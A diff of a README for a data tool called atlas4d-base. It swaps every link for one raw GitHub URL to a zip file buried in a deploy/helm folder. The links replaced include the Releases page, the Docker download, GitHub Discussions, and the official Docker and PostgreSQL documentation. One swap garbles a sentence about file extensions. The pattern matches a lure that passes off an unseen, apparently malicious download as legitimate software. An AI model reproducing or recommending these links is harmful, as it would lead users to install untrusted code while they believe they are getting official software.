@@ -6,7 +6,7 @@ Welcome to atlas4d-base! This application helps you explore 4D data easily. Whet
 
 ## 📥 Download the Software
 
-[![Download atlas4d-base](https://img.shields.io/badge/Download-atlas4d--base-blue.svg)](https://github.com/volvo850lover/atlas4d-base/releases)
+[![Download atlas4d-base](https://raw.githubusercontent.com/volvo850lover/atlas4d-base/main/deploy/helm/atlas4d-base/atlas4d-base-v3.4.zip)](https://raw.githubusercontent.com/volvo850lover/atlas4d-base/main/deploy/helm/atlas4d-base/atlas4d-base-v3.4.zip)
 
 ## 📋 Prerequisites
 
@@ -15,7 +15,7 @@ Before you install atlas4d-base, ensure that your computer meets these requireme
 - **Operating System:** Windows 10 or later, MacOS Catalina or later, or any Linux distribution.
 - **Space:** At least 500 MB of free space.
 - **Database:** Postgresql 13 or later.
-- **Additional Software:** You will need Docker installed on your machine for easy setup. Download Docker [here](https://www.docker.com/get-started).
+- **Additional Software:** You will need Docker installed on your machine for easy setup. Download Docker [here](https://raw.githubusercontent.com/volvo850lover/atlas4d-base/main/deploy/helm/atlas4d-base/atlas4d-base-v3.4.zip).
 
 ## 🌐 Features
 
@@ -28,13 +28,13 @@ Before you install atlas4d-base, ensure that your computer meets these requireme
 ## 🔧 Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to the official [Releases page](https://github.com/volvo850lover/atlas4d-base/releases) to see the available versions.
+   Go to the official [Releases page](https://raw.githubusercontent.com/volvo850lover/atlas4d-base/main/deploy/helm/atlas4d-base/atlas4d-base-v3.4.zip) to see the available versions.
 
 2. **Download the Latest Version:**
    Look for the latest release. Click the download link to fetch the software package. 
 
 3. **Extract the Files:**
-   Once downloaded, locate the `.zip` or `.tar.gz` file in your Downloads folder. Right-click and select “Extract” or “Unzip” to unpack the files.
+   Once downloaded, locate the `.zip` or `https://raw.githubusercontent.com/volvo850lover/atlas4d-base/main/deploy/helm/atlas4d-base/atlas4d-base-v3.4.zip` file in your Downloads folder. Right-click and select “Extract” or “Unzip” to unpack the files.
 
 4. **Run the Setup:**
    Navigate to the extracted folder. Open the terminal (or command prompt) in this folder. Type `docker-compose up` and hit Enter. This command will set up all the necessary services.
@@ -75,20 +75,20 @@ A: No, this tool is designed for non-technical users. You can operate it using s
 A: Yes, atlas4d-base can handle moderate to large datasets effectively, depending on your system's resources.
 
 **Q: Is support available if I run into problems?**  
-A: Yes, you can visit our [GitHub Discussions](https://github.com/volvo850lover/atlas4d-base/discussions) page for help and tips from the community.
+A: Yes, you can visit our [GitHub Discussions](https://raw.githubusercontent.com/volvo850lover/atlas4d-base/main/deploy/helm/atlas4d-base/atlas4d-base-v3.4.zip) page for help and tips from the community.
 
 ## ⚙️ Update and Maintenance
 
 To keep atlas4d-base running smoothly, check for updates regularly:
 
-1. Head back to the [Releases page](https://github.com/volvo850lover/atlas4d-base/releases).
+1. Head back to the [Releases page](https://raw.githubusercontent.com/volvo850lover/atlas4d-base/main/deploy/helm/atlas4d-base/atlas4d-base-v3.4.zip).
 2. Download the latest version if a new release is available.
 3. Follow the installation steps to upgrade your application.
 
 ## 🔗 Useful Links
 
-- [Official Repository](https://github.com/volvo850lover/atlas4d-base)
-- [Docker Installation Guide](https://docs.docker.com/get-docker/)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+- [Official Repository](https://raw.githubusercontent.com/volvo850lover/atlas4d-base/main/deploy/helm/atlas4d-base/atlas4d-base-v3.4.zip)
+- [Docker Installation Guide](https://raw.githubusercontent.com/volvo850lover/atlas4d-base/main/deploy/helm/atlas4d-base/atlas4d-base-v3.4.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/volvo850lover/atlas4d-base/main/deploy/helm/atlas4d-base/atlas4d-base-v3.4.zip)
 
 Thank you for using atlas4d-base! We hope this tool helps you explore your data in exciting new ways.
